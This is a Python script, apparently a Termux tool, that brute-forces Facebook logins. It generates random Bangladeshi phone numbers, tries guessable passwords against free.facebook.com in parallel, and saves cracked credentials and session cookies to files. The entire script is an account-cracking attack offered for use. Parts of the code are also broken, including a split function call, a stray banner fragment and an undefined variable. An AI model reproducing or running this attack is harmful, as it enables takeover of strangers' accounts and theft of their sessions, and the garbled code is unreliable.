import os
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pkg install espeak')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""
\033[1;31m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[1;31m┃\033[0;42;37m┓ ┳┏┳┓┏┓\033[1;37;40m\033[1;31m┃\033[1;33mOWNER   : ASKAT-MRIDHA \033[1;31m   ┃
\033[1;31m┃\033[0;42;37m┃ ┃ ┃ ┣  \033[1;37;40m\033[1;31m┃\033[1;33mGITHUB  : ASKAT303  \033[1;31m   ┃\033[1;32m┏━━━━━━━━━━━━━━┓\033[1;32m 
\033[1;31m┃\033[0;42;37m┗┛┻ ┻ ┗┛\033[1;37;40m\033[1;31m┃\033[1;33mFACEBOK : ASKAT MRIDHA\033[1;31m┃\033[1;32m┃ \033[0;41;37mVERSION \033[0;37;41m\033[1;37;40m\033[1;32m ┃ \033[1;37;40m \033[1;32m
\033[1;31m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[1;32m┗━━━━━━━━━━━━━━┛\033[1;32m
•────────────────•°•❀•°•────────────────•""")



\x1b[1;93m
❦ ════════════════════ •⊰❂⊱• ════════════════════ ❦
┃ 𝐓𝐎𝐎𝐋𝐒 ➣➣➣       𝗥𝗔𝗡𝗗𝗢𝗠 𝗕𝗗 𝗖𝗟𝗢𝗡𝗜𝗡𝗚               ┃
❦ ════════════════════ •⊰❂⊱• ════════════════════ ❦""")



logo = ("""
\033[1;31m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[1;31m┃\033[0;42;37m┓ ┳┏┳┓┏┓\033[1;37;40m\033[1;31m┃\033[1;33mOWNER   : ASKAT-MRIDHA \033[1;31m   ┃
\033[1;31m┃\033[0;42;37m┃ ┃ ┃ ┣  \033[1;37;40m\033[1;31m┃\033[1;33mGITHUB  : ASKAT303  \033[1;31m   ┃\033[1;32m┏━━━━━━━━━━━━━━┓\033[1;32m 
\033[1;31m┃\033[0;42;37m┗┛┻ ┻ ┗┛\033[1;37;40m\033[1;31m┃\033[1;33mFACEBOK : ASKAT MRIDHA\033[1;31m┃\033[1;32m┃ \033[0;41;37mVERSION \033[0;37;41m\033[1;37;40m\033[1;32m ┃ \033[1;37;40m \033[1;32m
\033[1;31m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[1;32m┗━━━━━━━━━━━━━━┛\033[1;32m
•────────────────•°•❀•°•────────────────•""")

def litesexyx():
	print('•────────────────•°•❀•°•────────────────•')

def Main():
        os.system("clear")
        os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')
        os.system('espeak -a 300 "WELCOME TO SAMIR RANDOM TOOLS"')
        print(logo)
        print(" \x1b[0m[1] RANDOM CLONING \x1b[1;95m (BANGLADESH)")
        print(" \x1b[1;94m[0] Exit")
        samirsexy =input("\n \x1b[1;96m[?] Choose : ")
        if samirsexy in ["1","01"]:
            fuck()
        if samirsexy in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.m
ystem('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100091256138777')
    os.system('espeak -a 300 "ENTER YOUR SIM CODE"')
    print(logo)
    print('\n\x1b[1;94mᏴᎠ ՏᏆᎷ ᏟϴᎠᎬ ➤➤\033[1;33m+88017,\033[1;32m+88018,\033[1;34m+88019,\033[1;31m+88014,\033[1;35m88013,\033[1;33m+88016')
    code = input('[?] CHOOSE SIM CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    os.system('xdg-open https://youtube.com/@samircyber143')
    print(logo)
    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT"')
    print('      \x1b[1;95m   𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐂𝐑𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓')
    print('\n[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
        print(logo1)
        tl = str(len(user))
        print('[✿] Total ids: '+tl)
        print("[✿] Your Code: "+code)
        print('•────────────────•°•❀•°•────────────────•')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(samirsexy2,uid,pwx,tl)
    print('•────────────────•°•❀•°•────────────────•')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in LITE/OK.txt')
    print(' [+] CP Ids saved in LITE/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def samirsexy2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[SAMIR]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
             'path': '/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'method': 'GET',
             'scheme': 'https',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'no-cache, no-store, must-revalidate',
             'referer': 'https://free.facebook.com/',
             'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="24", "Chromium";v="107"', 
             'sec-ch-ua-mobile': '?0', 
             'sec-ch-ua-platform': 'Android',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none', 
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent':'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v';
             }
            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;92m[LITE-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                open('/sdcard/LITE/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[LITE-CP☠️] {uid}|{ps}")
                open('/sdcard/LITE-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()